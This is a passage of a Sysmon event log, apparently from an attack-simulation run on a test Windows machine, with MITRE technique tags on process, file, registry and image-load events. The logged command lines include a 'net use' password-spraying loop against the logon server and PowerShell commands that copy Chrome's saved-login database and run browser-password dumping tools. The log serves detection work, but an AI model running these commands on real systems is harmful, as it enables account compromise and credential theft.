+CommandLine: ""cmd.exe"" /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & echo Spring2022>> passwords.txt & echo ChangeMe!>> passwords.txt & @FOR /F ""delims="" %%p in (passwords.txt) DO @net use %%logonserver%%\IPC$ /user:""%%userdomain%%\%%username%%"" ""%%p"" 1>NUL 2>&1 && @echo [*] %%username%%:%%p && @net use /delete %%logonserver%%\IPC$ > NUL
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:47 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:47.619
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5723-656d-ee02-000000001000}
+TargetProcessId: 1160
+TargetImage: C:\Windows\system32\whoami.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96BE308D4)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:47 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
+UtcTime: 2023-12-04 04:35:47.623
+ProcessGuid: {1ac2ee8c-5723-656d-ee02-000000001000}
+ProcessId: 1160
+Image: C:\Windows\System32\whoami.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: whoami - displays logged on user information
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: whoami.exe
+CommandLine: ""C:\Windows\system32\whoami.exe""
+CurrentDirectory: C:\Users\Test\Desktop\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=1915FBFDB73FDD200C47880247ACDDE5442431A9,MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:47 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:47.603
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5723-656d-ed02-000000001000}
+TargetProcessId: 5020
+TargetImage: C:\Windows\system32\HOSTNAME.EXE
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96BE308D4)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:44 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness
+UtcTime: 2023-12-04 04:35:44.134
+ProcessGuid: {1ac2ee8c-542b-656d-1a01-000000001000}
+ProcessId: 244
+Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MsMpEng.exe
+TargetFilename: C:\Windows\Temp\01da266b580b6329
+CreationUtcTime: 2023-12-04 04:35:44.134
+User: NT AUTHORITY\SYSTEM"
+Information,12/3/2023 8:35:35 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:35.242
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:35 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:35.242
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:34 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: -
+UtcTime: 2023-12-04 04:35:34.903
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\urlmon.dll
+FileVersion: 11.00.19041.3324 (WinBuild.160101.0800)
+Description: OLE32 Extensions for Win32
+Product: Internet Explorer
+Company: Microsoft Corporation
+OriginalFileName: UrlMon.dll
+Hashes: SHA1=B99CF4A9818294D2A7B0A53FC74781F7738DC48C,MD5=139F127E75EBF7B8B35A0EA4CC964D93,SHA256=F20541CBEA7573090C939E0807692246037EDD0FC2345CBF8A9452E8784AB54E,IMPHASH=E08970115519040D5D8DDD9206F445D3
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:34 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:34.477
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:34 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:34.014
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+PipeName: \PSHost.133461381336903295.8168.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:33.913
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_1f5l45fz.thw.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:33.863
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_1f5l45fz.thw.ps1
+CreationUtcTime: 2023-12-04 04:35:33.854
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:33.842
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:33.793
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:33.793
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:33.778
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:33.778
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:33.778
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:33.692
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5715-656d-eb02-000000001000}
+TargetProcessId: 8168
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:33.690
+ProcessGuid: {1ac2ee8c-5715-656d-eb02-000000001000}
+ProcessId: 8168
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" -Destination \""""C:temp\..\ExternalPayloads\"""" > $null
+Remove-Item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" > $null
+Copy-Item \""""$env:C:temp\src\Login Data\"""" -Destination \""""$env:localappdata\Google\Chrome\User Data\Default\\"""" > $null
+cd \""""$env:C:temp\bin\""""
+.\BrowserCollector.exe}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:33.692
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:33.529
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:33.529
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:33.513
+ProcessGuid: {1ac2ee8c-5711-656d-ea02-000000001000}
+ProcessId: 6848
+Image: C:temp\bin\WebBrowserPassView.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\bin\WebBrowserPassView.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:33.490
+SourceProcessGUID: {1ac2ee8c-570f-656d-e802-000000001000}
+SourceProcessId: 6112
+SourceThreadId: 4488
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5711-656d-ea02-000000001000}
+TargetProcessId: 6848
+TargetImage: C:temp\bin\WebBrowserPassView.exe
+GrantedAccess: 0x1F3FFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d4d4|C:\Windows\System32\KERNELBASE.dll+308ee|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+34f460|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2cd80e|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2cc3b5|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b2ede|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b25a5|UNKNOWN(00007FF96B8BA982)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:33 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness
+UtcTime: 2023-12-04 04:35:33.490
+ProcessGuid: {1ac2ee8c-542b-656d-1a01-000000001000}
+ProcessId: 244
+Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MsMpEng.exe
+TargetFilename: C:\Windows\Temp\01da266b51b3273a
+CreationUtcTime: 2023-12-04 04:35:33.490
+User: NT AUTHORITY\SYSTEM"
+Information,12/3/2023 8:35:29 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:29.165
+SourceProcessGUID: {1ac2ee8c-570f-656d-e802-000000001000}
+SourceProcessId: 6112
+SourceThreadId: 4488
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5711-656d-ea02-000000001000}
+TargetProcessId: 6848
+TargetImage: C:temp\bin\WebBrowserPassView.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\SYSTEM32\windows.storage.dll+17231d|C:\Windows\SYSTEM32\windows.storage.dll+c212c|C:\Windows\SYSTEM32\windows.storage.dll+ef1ac|C:\Windows\SYSTEM32\windows.storage.dll+eefd3|C:\Windows\SYSTEM32\windows.storage.dll+ef63d|C:\Windows\SYSTEM32\windows.storage.dll+1d9d60|C:\Windows\SYSTEM32\windows.storage.dll+ef7ef|C:\Windows\SYSTEM32\windows.storage.dll+c2757|C:\Windows\System32\shell32.dll+7a5ad|C:\Windows\System32\shell32.dll+447b9|C:\Windows\System32\shell32.dll+470e0|C:\Windows\System32\shell32.dll+47d3b|C:\Windows\System32\shell32.dll+4757e|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+7a68fc|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+921cf2|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+921da9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+912c82|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+913230|UNKNOWN(00007FF96B88F533)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:28 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: -
+UtcTime: 2023-12-04 04:35:28.721
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\urlmon.dll
+FileVersion: 11.00.19041.3324 (WinBuild.160101.0800)
+Description: OLE32 Extensions for Win32
+Product: Internet Explorer
+Company: Microsoft Corporation
+OriginalFileName: UrlMon.dll
+Hashes: SHA1=B99CF4A9818294D2A7B0A53FC74781F7738DC48C,MD5=139F127E75EBF7B8B35A0EA4CC964D93,SHA256=F20541CBEA7573090C939E0807692246037EDD0FC2345CBF8A9452E8784AB54E,IMPHASH=E08970115519040D5D8DDD9206F445D3
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:28 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:28.363
+ProcessGuid: {1ac2ee8c-570f-656d-e802-000000001000}
+ProcessId: 6112
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
